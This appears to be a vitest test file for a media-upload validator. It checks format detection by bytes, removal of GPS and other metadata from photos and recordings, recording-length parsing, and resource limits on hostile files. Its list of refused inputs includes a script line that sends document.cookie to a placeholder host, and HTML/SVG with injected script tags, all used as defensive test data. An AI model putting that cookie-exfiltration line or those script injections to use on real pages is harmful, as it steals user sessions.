// Ticket 3.18: the media checks on the bytes themselves (criteria 3 and 4). Real encoder output (Chromium's JPEG and
// MediaRecorder's WebM) and the decoding of a stripped photo are proved in browser.test.ts.
import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { exifWithGps, filler, fragmentedMp4, jpegOfSize, mp4OfSize, mp4TitleBox, mp4WithSampleTable, oggOfSize, PNG_SIGNATURE, segment, webmOfSize, webmTags, xmpWithGps } from "./fixtures.js";
import { detectMedia, inspectMedia, MEDIA_CONTENT_TYPES, recordingSeconds, stripJpegMetadata, stripRecordingMetadata } from "./formats.js";

const KB = 1024;

/** Every JPEG marker in a JPEG's header part (before the first scan's data). */
function markers(jpeg: Buffer): number[] {
  const found: number[] = [];
  let pos = 2;
  while (pos < jpeg.length) {
    const marker = jpeg[pos + 1] as number;
    found.push(marker);
    if (marker === 0xda || marker === 0xd9) break;
    pos += 2 + jpeg.readUInt16BE(pos + 2);
  }
  return found;
}

describe("accepted formats, by their bytes", () => {
  it("accepts a JPEG, a WebM/Opus, an Ogg/Opus and an MP4 with AAC or Opus audio, each with its fixed content type", () => {
    expect(detectMedia(jpegOfSize(10 * KB))).toBe("jpeg");
    expect(detectMedia(webmOfSize(10 * KB))).toBe("webm");
    expect(detectMedia(oggOfSize(10 * KB))).toBe("ogg");
    expect(detectMedia(mp4OfSize(10 * KB))).toBe("mp4");
    expect(detectMedia(mp4OfSize(10 * KB, [["soun", "Opus"]]))).toBe("mp4");
    expect(MEDIA_CONTENT_TYPES).toEqual({ jpeg: "image/jpeg", webm: "audio/webm", ogg: "audio/ogg", mp4: "audio/mp4" });
  });

  it("criterion 3: refuses a PNG, an HTML page, a script, SVG, a PDF, a GIF, empty bytes and a video (WebM VP8/VP9, MP4 H.264, Ogg Theora)", () => {
    const refused: [string, Buffer][] = [
      ["png", Buffer.concat([PNG_SIGNATURE, Buffer.alloc(100)])],
      ["html", Buffer.from("<!doctype html><html><script>alert(1)</script></html>")],
      ["script", Buffer.from("fetch('https://example.com/?' + document.cookie)")],
      ["svg", Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>')],
      ["pdf", Buffer.from("%PDF-1.7\n")],
      ["gif", Buffer.from("GIF89a\x01\x00\x01\x00")],
      ["empty", Buffer.alloc(0)],
      ["webm vp8 video", webmOfSize(10 * KB, ["V_VP8"])],
      ["webm video and audio", webmOfSize(10 * KB, ["A_OPUS", "V_VP9"])],
      ["webm vorbis", webmOfSize(10 * KB, ["A_VORBIS"])],
      ["matroska", webmOfSize(10 * KB, ["A_OPUS"], "matroska")],
      ["mp4 video", mp4OfSize(10 * KB, [["vide", "avc1"]])],
      ["mp4 video and audio", mp4OfSize(10 * KB, [["soun", "mp4a"], ["vide", "avc1"]])],
      ["mp4 sound of another codec", mp4OfSize(10 * KB, [["soun", "ac-3"]])],
      ["ogg theora", oggOfSize(10 * KB, Buffer.from("\x80theora\x03\x02\x01", "latin1"))],
    ];
    for (const [name, bytes] of refused) expect(detectMedia(bytes), name).toBeUndefined();
  });

  it("refuses a declared format whose structure breaks: a cut JPEG, a JPEG without EOI or scan, a cut WebM, a cut MP4", () => {
    const jpeg = jpegOfSize(5 * KB);
    expect(detectMedia(jpeg.subarray(0, 1000))).toBeUndefined();
    expect(detectMedia(jpeg.subarray(0, jpeg.length - 2))).toBeUndefined();
    expect(detectMedia(Buffer.from([0xff, 0xd8, 0xff, 0xd9]))).toBeUndefined();
    expect(detectMedia(webmOfSize(5 * KB).subarray(0, 40))).toBeUndefined();
    expect(detectMedia(mp4OfSize(5 * KB).subarray(0, 100))).toBeUndefined();
    // HTML behind a JPEG's first bytes is not a JPEG.
    expect(detectMedia(Buffer.concat([Buffer.from([0xff, 0xd8, 0xff]), Buffer.from("<html><script>alert(1)</script>")]))).toBeUndefined();
  });

  it("ends on any bytes: random and adversarial inputs never throw or loop", () => {
    let x = 1;
    const random = (n: number) => Buffer.from(Array.from({ length: n }, () => ((x = (x * 1103515245 + 12345) >>> 0) >>> 16) & 0xff));
    for (const start of [Buffer.from([0xff, 0xd8, 0xff]), Buffer.from([0x1a, 0x45, 0xdf, 0xa3]), Buffer.from("OggS"), Buffer.from("\0\0\0\x08ftyp", "latin1")]) {
      for (let i = 0; i < 300; i += 1) expect(() => detectMedia(Buffer.concat([start, random(i * 7)]))).not.toThrow();
    }
    // Zero-sized and huge-sized boxes and elements.
    expect(detectMedia(Buffer.concat([Buffer.from("\0\0\0\x00ftyp", "latin1"), Buffer.alloc(8)]))).toBeUndefined();
    expect(detectMedia(Buffer.concat([Buffer.from([0x1a, 0x45, 0xdf, 0xa3, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff])]))).toBeUndefined();
  });
});

describe("criterion 4: a photo loses its location data", () => {
  it("removes the Exif segment with its GPS IFD, XMP, IPTC, comments, other APPn and an MPF index, and keeps JFIF, the ICC profile and Adobe's segment", () => {
    const icc = segment(0xe2, Buffer.from("ICC_PROFILE\0\x01\x01colour data", "latin1"));
    const mpf = segment(0xe2, Buffer.from("MPF\0index of the extra pictures", "latin1"));
    const adobe = segment(0xee, Buffer.from("Adobe\0\x64\0\0\0\0\x01", "latin1"));
    const iptc = segment(0xed, Buffer.from("Photoshop 3.0\0city=Paris", "latin1"));
    const comment = segment(0xfe, Buffer.from("taken at 12 rue de la Paix"));
    const maker = segment(0xe9, Buffer.from("maker notes with a place"));
    const photo = jpegOfSize(20 * KB, [exifWithGps(), xmpWithGps(), icc, mpf, adobe, iptc, comment, maker]);
    expect(photo.includes(Buffer.from("Exif\0\0"))).toBe(true);

    const stripped = stripJpegMetadata(photo);
    expect(stripped).toBeDefined();
    const kept = stripped as Buffer;
    for (const gone of ["Exif", "GPS", "xap/1.0", "GPSLatitude", "Photoshop", "Paris", "rue de la Paix", "maker notes", "MPF\0"]) expect(kept.includes(Buffer.from(gone)), gone).toBe(false);
    expect(markers(kept)).toEqual([0xe0, 0xe2, 0xee, 0xdb, 0xc0, 0xc4, 0xda]);
    expect(kept.includes(Buffer.from("ICC_PROFILE\0"))).toBe(true);
    expect(kept.includes(Buffer.from("Adobe"))).toBe(true);
    // The picture's own segments and data are unchanged: the result is the photo without the removed segments.
    const removed = [exifWithGps(), xmpWithGps(), mpf, iptc, comment, maker].reduce((n, s) => n + s.length, 0);
    expect(kept.length).toBe(photo.length - removed);
    expect(kept.subarray(-2)).toEqual(Buffer.from([0xff, 0xd9]));
    expect(detectMedia(kept)).toBe("jpeg");
  });

  it("drops anything after the picture's end (a phone's extra pictures, which carry their own Exif), and leaves a JPEG without metadata byte for byte", () => {
    const plain = jpegOfSize(8 * KB);
    expect(stripJpegMetadata(plain)?.equals(plain)).toBe(true);
    const withTrailer = Buffer.concat([plain, jpegOfSize(2 * KB, [exifWithGps()])]);
    expect(stripJpegMetadata(withTrailer)?.equals(plain)).toBe(true);
  });

  it("keeps stuffed bytes, restart markers and a progressive JPEG's later tables and scans", () => {
    const head = jpegOfSize(100).subarray(0, -2 - 0);
    const sosEnd = head.lastIndexOf(Buffer.from([0xff, 0xda])) + 2 + 8;
    const scan1 = Buffer.from([0x12, 0xff, 0x00, 0x34, 0xff, 0xd0, 0x56]);
    const dht = segment(0xc4, Buffer.concat([Buffer.from([0x10]), Buffer.alloc(16)]));
    const sos2 = segment(0xda, Buffer.from([1, 1, 0, 1, 5, 0]));
    const jpeg = Buffer.concat([head.subarray(0, sosEnd), scan1, dht, sos2, Buffer.from([0x78, 0x9a]), Buffer.from([0xff, 0xff, 0xd9])]);
    const stripped = stripJpegMetadata(jpeg);
    expect(stripped?.includes(scan1)).toBe(true);
    expect(stripped?.includes(dht)).toBe(true);
    expect(stripped?.includes(sos2)).toBe(true);
    expect(stripped?.subarray(-2)).toEqual(Buffer.from([0xff, 0xd9]));
  });
});

describe("try 2: the JPEG allow-list keeps only the picture's own segments and JFIF, ICC and Adobe", () => {
  it("keeps DRI and DAC, drops JPG (C8), JPGn (F0 to FD), DHP, EXP, reserved markers and TEM", () => {
    const dri = segment(0xdd, Buffer.from([0, 4]));
    const dac = segment(0xcc, Buffer.from([0x10, 0x11]));
    const dropped = [
      segment(0xc8, Buffer.from("jpg extension place")),
      segment(0xf0, Buffer.from("jpg0 place")),
      segment(0xf7, Buffer.from("jpg7 place")),
      segment(0xfd, Buffer.from("jpg13 place")),
      segment(0xde, Buffer.from("dhp place")),
      segment(0xdf, Buffer.from("exp place")),
      segment(0x02, Buffer.from("reserved place")),
      segment(0xbf, Buffer.from("reserved bf place")),
    ];
    const photo = jpegOfSize(10 * KB, [dri, dac, ...dropped, Buffer.from([0xff, 0x01])]);
    const kept = stripJpegMetadata(photo) as Buffer;
    expect(kept).toBeDefined();
    expect(kept.includes(Buffer.from("place"))).toBe(false);
    expect(markers(kept)).toEqual([0xe0, 0xdd, 0xcc, 0xdb, 0xc0, 0xc4, 0xda]);
    expect(kept.length).toBe(photo.length - dropped.reduce((n, s) => n + s.length, 0) - 2);
    expect(detectMedia(kept)).toBe("jpeg");
  });
});

describe("try 2: a recording's length, from its own container", () => {
  it("reads WebM from the last block (MediaRecorder writes no Duration) or the declared Duration, whichever is longer", () => {
    expect(recordingSeconds(webmOfSize(10 * KB, ["A_OPUS"], "webm", 42), "webm")).toBeCloseTo(42, 3);
    expect(recordingSeconds(webmOfSize(10 * KB, ["A_OPUS"], "webm", 1, 400), "webm")).toBeCloseTo(400, 3);
    expect(recordingSeconds(webmOfSize(10 * KB, ["A_OPUS"], "webm", 400, 1), "webm")).toBeCloseTo(400, 3);
  });

  it("reads Ogg/Opus from the last granule position, less the pre-skip", () => {
    expect(recordingSeconds(oggOfSize(10 * KB, undefined, 42), "ogg")).toBeCloseTo(42, 3);
    expect(recordingSeconds(oggOfSize(200 * KB, undefined, 306), "ogg")).toBeCloseTo(306, 3);
  });

  it("reads MP4 from mvhd, the sample table, and every kind of fragment (durations in trun, tfhd's default or trex's; with or without tfdt)", () => {
    expect(recordingSeconds(mp4OfSize(10 * KB, [["soun", "mp4a"]], 42), "mp4")).toBeCloseTo(42, 3);
    // 2 x 48,000 samples of 1,000 ticks... here 15,000 samples of 1,024 at 48 kHz = 320 s, while mvhd says 0.
    expect(recordingSeconds(mp4WithSampleTable(15_000, 1024), "mp4")).toBeCloseTo(320, 3);
    for (const durations of ["trun", "tfhd", "trex"] as const) {
      for (const tfdt of [true, false]) {
        const seconds = recordingSeconds(fragmentedMp4(310, { durations, tfdt }), "mp4") as number;
        expect(seconds, `${durations} ${tfdt}`).toBeGreaterThanOrEqual(310);
        expect(seconds, `${durations} ${tfdt}`).toBeLessThan(310.2);
      }
    }
    expect(recordingSeconds(fragmentedMp4(30, { entry: "Opus" }), "mp4")).toBeCloseTo(30, 0);
  });

  it("cannot read a length (undefined, so the API refuses) when there is none: no block, no audio page, nothing but zeros", () => {
    const noBlock = webmOfSize(10 * KB);
    const cluster = noBlock.indexOf(Buffer.from([0x1f, 0x43, 0xb6, 0x75]));
    expect(recordingSeconds(noBlock.subarray(0, cluster), "webm")).toBeUndefined();
    expect(recordingSeconds(oggOfSize(10 * KB, undefined, null), "ogg")).toBeUndefined();
    expect(recordingSeconds(mp4OfSize(10 * KB, [["soun", "mp4a"]], 0), "mp4")).toBeUndefined();
    // A cut file: a block or page running past the end.
    expect(recordingSeconds(webmOfSize(10 * KB).subarray(0, 9 * KB), "webm")).toBeUndefined();
    expect(recordingSeconds(oggOfSize(10 * KB).subarray(0, 9 * KB), "ogg")).toBeUndefined();
    // A fragment whose samples have no duration anywhere.
    const noDefault = fragmentedMp4(10, { durations: "trex" });
    const trex = noDefault.indexOf(Buffer.from("trex"));
    noDefault.writeUInt32BE(0, trex + 4 + 12);
    expect(recordingSeconds(noDefault, "mp4")).toBeUndefined();
  });

  it("ends on hostile input in linear time: random bytes, 4 MB of tiny elements or pages, huge counts", () => {
    let x = 3;
    const random = (n: number) => Buffer.from(Array.from({ length: n }, () => ((x = (x * 1103515245 + 12345) >>> 0) >>> 16) & 0xff));
    for (const [kind, start] of [
      ["webm", webmOfSize(200).subarray(0, 120)],
      ["ogg", oggOfSize(200).subarray(0, 60)],
      ["mp4", mp4OfSize(600).subarray(0, 400)],
    ] as const) {
      for (let i = 0; i < 300; i += 1) expect(() => recordingSeconds(Buffer.concat([start, random(i * 7)]), kind)).not.toThrow();
    }
    const MB4 = 4 * 1024 * 1024;
    const started = Date.now();
    // WebM: 2 million two-byte Void elements between the Tracks and the Cluster, which still measures 7 s at the end.
    const small = webmOfSize(200, ["A_OPUS"], "webm", 7);
    const cluster = small.indexOf(Buffer.from([0x1f, 0x43, 0xb6, 0x75]));
    const voids = Buffer.alloc(MB4, 0);
    for (let i = 0; i < MB4; i += 2) voids[i] = 0xec;
    for (let i = 1; i < MB4; i += 2) voids[i] = 0x80;
    expect(recordingSeconds(Buffer.concat([small.subarray(0, cluster), voids, small.subarray(cluster)]), "webm")).toBeCloseTo(7, 3);
    // Ogg: 4 MB of empty pages after the head (155,000 pages).
    const ogg = oggOfSize(200);
    const emptyPage = Buffer.concat([Buffer.from("OggS"), Buffer.from([0, 0]), Buffer.alloc(8, 0xff), ogg.subarray(14, 18), Buffer.alloc(8), Buffer.from([0])]);
    const pages = Buffer.concat(Array.from({ length: Math.floor(MB4 / emptyPage.length) }, () => emptyPage));
    expect(recordingSeconds(Buffer.concat([ogg, pages]), "ogg")).toBeCloseTo(10, 3);
    // MP4: a trun claiming 4 billion samples with per-sample durations (cut: undefined at once) and without (multiplied, never looped).
    const fragmented = fragmentedMp4(1, { fragments: 1 });
    const trun = fragmented.indexOf(Buffer.from("trun"));
    const huge = Buffer.from(fragmented);
    huge.writeUInt32BE(0xffffffff, trun + 8);
    expect(recordingSeconds(huge, "mp4")).toBeUndefined();
    const hugeDefault = Buffer.from(fragmentedMp4(1, { fragments: 1, durations: "tfhd" }));
    hugeDefault.writeUInt32BE(0xffffffff, hugeDefault.indexOf(Buffer.from("trun")) + 8);
    expect(recordingSeconds(hugeDefault, "mp4")).toBeUndefined();
    expect(Date.now() - started).toBeLessThan(2000);
  });
});

describe("try 2: a recording's metadata is blanked in place", () => {
  it("turns MP4 udta into a free box of zeros and WebM Tags into a Void element: same size, still the same format and length", () => {
    const mp4 = mp4OfSize(10 * KB, [["soun", "mp4a"]], 42, [mp4TitleBox("12 rue de la Paix")]);
    const cleanMp4 = stripRecordingMetadata(mp4, "mp4");
    expect(cleanMp4.length).toBe(mp4.length);
    expect(cleanMp4.includes(Buffer.from("rue de la Paix"))).toBe(false);
    expect(cleanMp4.includes(Buffer.from("udta"))).toBe(false);
    expect(cleanMp4.includes(Buffer.from("free"))).toBe(true);
    expect(detectMedia(cleanMp4)).toBe("mp4");
    expect(recordingSeconds(cleanMp4, "mp4")).toBeCloseTo(42, 3);
    // The input is not changed (the API may still need it).
    expect(mp4.includes(Buffer.from("rue de la Paix"))).toBe(true);

    const webm = Buffer.concat([webmOfSize(10 * KB, ["A_OPUS"], "webm", 42), webmTags("12 rue de la Paix")]);
    expect(recordingSeconds(webm, "webm")).toBeCloseTo(42, 3);
    const cleanWebm = stripRecordingMetadata(webm, "webm");
    expect(cleanWebm.length).toBe(webm.length);
    expect(cleanWebm.includes(Buffer.from("rue de la Paix"))).toBe(false);
    expect(detectMedia(cleanWebm)).toBe("webm");
    expect(recordingSeconds(cleanWebm, "webm")).toBeCloseTo(42, 3);
    // Ogg is stored as received.
    const ogg = oggOfSize(10 * KB);
    expect(stripRecordingMetadata(ogg, "ogg").equals(ogg)).toBe(true);
  });
});

describe("try 3: APP0 and APP14 are kept only when they are JFIF and Adobe's", () => {
  const jfif = segment(0xe0, Buffer.from("JFIF\0\x01\x02\0\0\x01\0\x01\0\0", "latin1"));
  const adobe = segment(0xee, Buffer.from("Adobe\0\x64\0\0\0\0\x01", "latin1"));
  /** A JPEG whose APP0 (right after SOI) is `app0`, then `extra`. */
  const photoWith = (app0: Buffer, extra: Buffer[]): Buffer => {
    const plain = jpegOfSize(6 * KB, extra);
    // jpegOfSize's own APP0 (JFIF, 18 bytes) follows SOI: replace it.
    return Buffer.concat([plain.subarray(0, 2), app0, plain.subarray(2 + jfif.length)]);
  };

  it("drops a JFXX APP0 (its own thumbnail), an APP0 with text and a location, and an APP14 that is not Adobe's", () => {
    const jfxx = segment(0xe0, Buffer.concat([Buffer.from("JFXX\0\x10", "latin1"), filler(300, 5)]));
    const textApp0 = segment(0xe0, Buffer.from("GPS 48.8566 N 2.3522 E taken at home", "latin1"));
    const almostJfif = segment(0xe0, Buffer.from("JFIF", "latin1"));
    const otherApp14 = segment(0xee, Buffer.from("Adobf location Paris", "latin1"));
    const shortApp14 = segment(0xee, Buffer.from("Ado", "latin1"));
    const photo = photoWith(jfxx, [textApp0, almostJfif, otherApp14, shortApp14]);
    const kept = stripJpegMetadata(photo) as Buffer;
    expect(kept).toBeDefined();
    for (const gone of ["JFXX", "GPS", "taken at home", "Adobf", "Paris", "Ado"]) expect(kept.includes(Buffer.from(gone)), gone).toBe(false);
    expect(kept.includes(filler(300, 5))).toBe(false);
    expect(markers(kept)).toEqual([0xdb, 0xc0, 0xc4, 0xda]);
    expect(kept.length).toBe(photo.length - [jfxx, textApp0, almostJfif, otherApp14, shortApp14].reduce((n, s) => n + s.length, 0));
    expect(detectMedia(kept)).toBe("jpeg");
  });

  it("keeps a real JFIF APP0 and a real Adobe APP14, byte for byte", () => {
    const photo = photoWith(jfif, [adobe]);
    const kept = stripJpegMetadata(photo) as Buffer;
    expect(kept.equals(photo)).toBe(true);
    expect(markers(kept)).toEqual([0xe0, 0xee, 0xdb, 0xc0, 0xc4, 0xda]);
  });
});

describe("try 3: hostile files stay within time and memory", () => {
  it("inspectMedia returns the photo stripped once, the same bytes stripJpegMetadata gives", () => {
    const photo = jpegOfSize(20 * KB, [exifWithGps(), xmpWithGps()]);
    const found = inspectMedia(photo);
    expect(found?.kind).toBe("jpeg");
    expect(found?.kind === "jpeg" && found.photo.equals(stripJpegMetadata(photo) as Buffer)).toBe(true);
    expect(inspectMedia(webmOfSize(2000))).toEqual({ kind: "webm" });
    expect(inspectMedia(PNG_SIGNATURE)).toBeUndefined();
  });

  // Each case runs in a child process under a 32 MB JavaScript heap (try 2's walks ran out of heap there: one Buffer per
  // restart marker or segment, one object per EBML element or MP4 box, 2 million of them) and reports its peak memory.
  const probe = fileURLToPath(new URL("./hostile-probe.ts", import.meta.url));
  it.each([
    ["restarts", "jpeg"],
    ["segments", "jpeg"],
    ["webm", "webm"],
    ["mp4", "mp4"],
  ])("4 MB of tiny parts (%s): checked, measured and stripped in under 5 s with under 100 MB more memory", (which, kind) => {
    const run = spawnSync(process.execPath, ["--max-old-space-size=32", "--import", "tsx", probe, which], { encoding: "utf8", timeout: 30_000 });
    expect(run.status, run.stderr).toBe(0);
    const result = JSON.parse(run.stdout) as { kind: string; bytes: number; ms: number; peakGrowthMb: number; inputBytes: number; seconds?: number };
    expect(result.kind).toBe(kind);
    expect(result.inputBytes).toBeGreaterThan(4_000_000);
    if (kind === "jpeg") expect(result.bytes).toBe(result.inputBytes);
    if (kind === "webm") expect(result.seconds).toBeCloseTo(7, 3);
    if (kind === "mp4") expect(result.seconds).toBeCloseTo(10, 3);
    // Over 10x the measured 200-400 ms (CI runners are slower and run Chromium beside it; .claude/rules/platform.md).
    expect(result.ms).toBeLessThan(5000);
    expect(result.peakGrowthMb).toBeLessThan(100);
  }, 60_000);
});
